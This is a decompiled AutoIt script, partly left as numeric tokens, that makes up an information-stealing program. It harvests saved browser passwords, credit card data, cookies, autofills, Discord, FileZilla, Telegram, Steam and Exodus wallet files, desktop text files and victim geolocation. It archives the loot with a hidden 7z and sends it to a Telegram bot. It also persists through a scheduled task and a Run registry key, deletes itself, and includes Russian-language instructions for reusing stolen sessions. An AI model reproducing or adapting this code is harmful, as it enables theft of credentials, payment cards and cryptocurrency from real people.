MOVEANDINSTRUCT($PATH[$I][0],$DIR&"\1\"&$PATH[$I][2]&"\"&$PATH[$I][1],$DIR&"\1\"&$PATH[$I][2]&"\Инструкция по установке.txt",0,$INS)
8
7$PATH[$I][2]="Discord"5
54($DIR&"\1\"&$PATH[$I][2])
$INS="Для того, чтобы установить сессию для Discord нужно:"&@CRLF&"1) Скачать Discord (https://discordapp.com/download)"&@CRLF&'2) Закинуть содержимое папки лога Discord\Local Storage в путь "%appdata%\discord\Local Storage", сохранив, если есть, свои данные'&@CRLF&"3) Запустить Discord и радоваться"
MOVEANDINSTRUCT($PATH[$I][0],$DIR&"\1\"&$PATH[$I][2]&"\"&$PATH[$I][1],$DIR&"\1\"&$PATH[$I][2]&"\Инструкция по установке.txt",1,$INS)
7$PATH[$I][2]="FileZilla"5
54($DIR&"\1\"&$PATH[$I][2])
$INS="Для того, чтобы установить сессию для FileZilla нужно:"&@CRLF&"1) Скачать FileZilla (https://filezilla-project.org/download.php?type=client)"&@CRLF&'2) Закинуть содержимое файл в логе "FileZilla\recentservers.xml" в путь "%appdata%\FileZilla", сохранив, если есть, свои данные'&@CRLF&"3) Запустить FileZilla и радоваться"
MOVEANDINSTRUCT($PATH[$I][0],$DIR&"\1\"&$PATH[$I][2]&"\"&$PATH[$I][1],$DIR&"\1\"&$PATH[$I][2]&"\Инструкция по установке.txt",0,$INS)
7$PATH[$I][2]="Desktop TXT Files"1105($PATH[$I][0])<=10245
91($PATH[$I][0],$DIR&"\1\"&$PATH[$I][2]&"\"&336($PATH[$I][0],323(@DESKTOPDIR)),9)
8
14
$PROGRAMSARRAY=_ARRAYDELETEDUBLICATE(_FINDREGISTER("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall","","DisplayName"))
13$I=115$PROGRAMSARRAY[0][0]
$PROGRAMSTEXT&=" - "&$PROGRAMSARRAY[$I][0]&@CRLF
14
$PROCESSARRAY=266()
13$I=115$PROCESSARRAY[0][0]
$PROCESSTEXT&=" - "&$PROCESSARRAY[$I][0]&" / PID: "&$PROCESSARRAY[$I][1]&@CRLF
14
4$CREDIT[0][0]<>""5
13$I=115$CREDIT[0][0]
$CREDITTEXT&="Path: "&$CREDIT[$I][3]&@CRLF&"Card Number: "&$CREDIT[$I][0]&@CRLF&"Name: "&$CREDIT[$I][1]&@CRLF&"Date: "&$CREDIT[$I][2]&@CRLF&@CRLF
14
123($DIR&"\1\CreditCards.txt",$LOGO&$CREDITTEXT)
8
4$PASSWORDS[0][0]<>""5
13$I=115$PASSWORDS[0][0]
$PASSWORDSTEXT&="Path: "&$PASSWORDS[$I][2]&@CRLF&"Link: "&$PASSWORDS[$I][3]&@CRLF&"Login: "&$PASSWORDS[$I][0]&@CRLF&"Password: "&$PASSWORDS[$I][1]&@CRLF&@CRLF
14
123($DIR&"\1\Passwords.txt",$LOGO&$PASSWORDSTEXT)
8
$UB=369($COOKIES)-1
4$UB<>05
54($DIR&"\1\Cookies")
13$I=015$UB
$REGPATHER=327(328(336($COOKIES[$I][1],323(@USERPROFILEDIR)+1),"\","."),".(cookies.sqlite|Cookies)$","")
123($DIR&"\1\Cookies\"&$REGPATHER&".txt",$COOKIES[$I][0]&@CRLF)
14
8
4$FORMH[0][0]<>""1$FORMH[0][0]>05
13$I=115$FORMH[0][0]
4$PREVBROWS=""5
$FORMHTEXT&="Path: "&$FORMH[$I][1]&@CRLF&"Logins/Users/Names Found: "&@CRLF&" - "&$FORMH[$I][0]&@CRLF
7$PREVBROWS<>$FORMH[$I][1]5
$FORMHTEXT&=@CRLF&"Path: "&$FORMH[$I][1]&@CRLF&"Logins/Users/Names Found: "&@CRLF&" - "&$FORMH[$I][0]&@CRLF
7$PREVBROWS=$FORMH[$I][1]5
$FORMHTEXT&=" - "&$FORMH[$I][0]&@CRLF
8
$PREVBROWS=$FORMH[$I][1]
14
$FORMHTEXT&=@CRLF
123($DIR&"\1\AutoFills.txt",$LOGO&$FORMHTEXT)
$FORMHTEXT=""
$PREVBROWS=""
8
4$FORMHP[0][0]<>""1$FORMHP[0][0]>05
13$I=115$FORMHP[0][0]
4$PREVBROWS=""5
$FORMHTEXT&="Path: "&$FORMHP[$I][1]&@CRLF&"Passwords Found: "&@CRLF&" - "&$FORMHP[$I][0]&@CRLF
7$PREVBROWS<>$FORMHP[$I][1]5
$FORMHTEXT&=@CRLF&"Path: "&$FORMHP[$I][1]&@CRLF&"Passwords Found: "&@CRLF&" - "&$FORMHP[$I][0]&@CRLF
7$PREVBROWS=$FORMHP[$I][1]5
$FORMHTEXT&=" - "&$FORMHP[$I][0]&@CRLF
8
$PREVBROWS=$FORMHP[$I][1]
14
4$FORMH[0][0]<>""5
123($DIR&"\1\AutoFills.txt",$FORMHTEXT)
6
123($DIR&"\1\AutoFills.txt",$LOGO&$FORMHTEXT)
8
8
$GPUITEM=$OBJ.ExecQuery("SELECT * FROM Win32_VideoController","WQL",16+32)
$CPUITEM=$OBJ.ExecQuery("SELECT * FROM Win32_Processor","WQL",16+32)
$MEM=309("%.2f Gb",239()[1]/1024/1024)
4231($GPUITEM)5
13$OBJITEM17$GPUITEM
$GPU=$OBJITEM.Name
14
8
4231($CPUITEM)5
13$OBJITEM17$CPUITEM
$CPU=$OBJITEM.Name
14
8
$IREAD=208("https://ipapi.co/json",3)
4323($IREAD)>755
$JS=JSON_DECODE(16($IREAD))
$INETDATA=" - IP: "&JSON_GET($JS,"[ip]")&@CRLF&" - Country: "&JSON_GET($JS,"[country_name]")&@CRLF&" - City: "&JSON_GET($JS,"[city]")&@CRLF&" - Region: "&JSON_GET($JS,"[region]")&@CRLF&" - ZipCode: "&JSON_GET($JS,"[postal]")&@CRLF&" - ISP: "&JSON_GET($JS,"[org]")&@CRLF&" - Coordinates: "&JSON_GET($JS,"[latitude]")&", "&JSON_GET($JS,"[longitude]")&@CRLF&" - UTC: "&JSON_GET($JS,"[utc_offset]")&" ("&JSON_GET($JS,"[timezone]")&")"
8
123($DIR&"\1\Information.txt",$LOGO&"Date: "&@MDAY&"."&@MON&"."&@YEAR&@CRLF&"Time: "&@HOUR&":"&@MIN&":"&@SEC&@CRLF&@CRLF&"OS: "&328(@OSVERSION,"WIN_","Windows ")&" "&@OSARCH&" / Build: "&@OSBUILD&@CRLF&"UserName: "&@USERNAME&@CRLF&"ComputerName: "&@COMPUTERNAME&@CRLF&"Processor: "&$CPU&@CRLF&"VideoCard: "&$GPU&@CRLF&"Memory: "&$MEM&@CRLF&"KeyBoard Layout ID: "&@KBLAYOUT&@CRLF&"Resolution: "&@DESKTOPWIDTH&"x"&@DESKTOPHEIGHT&"x"&@DESKTOPDEPTH&", "&@DESKTOPREFRESH&" GHz"&@CRLF&@CRLF&"Other Information:"&@CRLF&$INETDATA&@CRLF&@CRLF&"Soft / Windows Components / Windows Updates:"&@CRLF&$PROGRAMSTEXT&@CRLF&"Process List:"&@CRLF&$PROCESSTEXT)
SEVZRSRC($7ZPATH)
284($7ZPATH&' a "'&$DIR&"\"&$ID&'.7z" "'&$DIR&'\1\*" -y',"",@SW_HIDE)
94($7ZPATH)
$WATERTEXTTLGRM&="Information: "&@CRLF&$INETDATA&@CRLF&@CRLF&"Content:"&@CRLF
495($DIR&"\1\Passwords.txt")5$WATERTEXTTLGRM&=" - Passwords"&@CRLF
495($DIR&"\1\Information.txt")5$WATERTEXTTLGRM&=" - Information"&@CRLF
495($DIR&"\1\Screen.jpg")5$WATERTEXTTLGRM&=" - Screen"&@CRLF
495($DIR&"\1\AutoFills.txt")5$WATERTEXTTLGRM&=" - AutoFills"&@CRLF
495($DIR&"\1\CreditCards.txt")5$WATERTEXTTLGRM&=" - Credit Cards"&@CRLF
495($DIR&"\1\Cookies\*.txt")5$WATERTEXTTLGRM&=" - Cookies"&@CRLF
495($DIR&"\1\Desktop TXT Files")5$WATERTEXTTLGRM&=" - Desktop TXT Files"&@CRLF
495($DIR&"\1\Discord\*.txt")5$WATERTEXTTLGRM&=" - Discord"&@CRLF
495($DIR&"\1\Telegram\*.txt")5$WATERTEXTTLGRM&=" - Telegram"&@CRLF
495($DIR&"\1\Steam\*.txt")5$WATERTEXTTLGRM&=" - Steam"&@CRLF
495($DIR&"\1\Exodus\*.txt")5$WATERTEXTTLGRM&=" - Exodus"&@CRLF
495($DIR&"\1\FileZilla\*.txt")5$WATERTEXTTLGRM&=" - FileZilla"&@CRLF
57($DIR&"\1",1)
8
_INITBOT($TOKEN)
4_SENDDOCUMENT($TID,$DIR&"\"&$ID&".7z",$WATERTEXTTLGRM)<>""5
94($DIR&"\"&$ID&".7z")
94(@SCRIPTDIR&"\"&$ID&".log")
_TASKDELETE($TASK,$TDIR)
_TASKFOLDERDELETE($TDIR)
8
94($DIR&"\*.db")
8
4@SCRIPTFULLPATH<>$DIR&"\"&$FILE5
109(@SCRIPTFULLPATH,$DIR&"\"&$FILE,9)
123($DIR&"\"&$ID&".log","")
_TASKCREATE($TDIR&"\"&$TASK,"",1,@YEAR&"-"&@MON&"-"&@MDAY&"T"&@HOUR&":"&@MIN&":"&@SEC,"","","","","","","PT1M",39,3,0,"","",'"'&$DIR&"\"&$FILE&'"')
43_TASKEXISTS($TASK,$TDIR)5279("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",$TASK,"REG_SZ",'"'&$DIR&"\"&$FILE&'"')
4$IPLOG1<>""5
202($WATERTEXT)
205($IPLOG1,"",3)
8
281(@COMSPEC&' /c ping -n 5 127.0.0.1 & start "" "'&$DIR&"\"&$FILE&'"',"",@SW_HIDE)
35
8
4395($DIR&"\"&$ID&".log")5MELT(1)
32MELT($FLAG=0)
28$SCRIPT=@COMSPEC&" /c taskkill /f /pid "&@AUTOITPID&' & attrib -s -h -r -a /S /D "'&@SCRIPTDIR&'" & '
4$FLAG=15
$SCRIPT&='rd /s /q "'&@SCRIPTDIR&'"'
6
$SCRIPT&='del /q /f "'&@SCRIPTFULLPATH&'"'
8
281($SCRIPT,"",@SW_HIDE)
35
33
FUNC SEVZRSRC($PATH)
FILEINSTALL(".\RESS\7zr.exe",$PATH,1)
ENDFUNC
FUNC SQLITESRC($PATH)
FILEINSTALL(".\RESS\sqlite3.dll",$PATH,1)
ENDFUNC
; DeTokenise by myAut2Exe >The Open Source AutoIT/AutoHotKey script decompiler< - dmod 2.12 build(269)

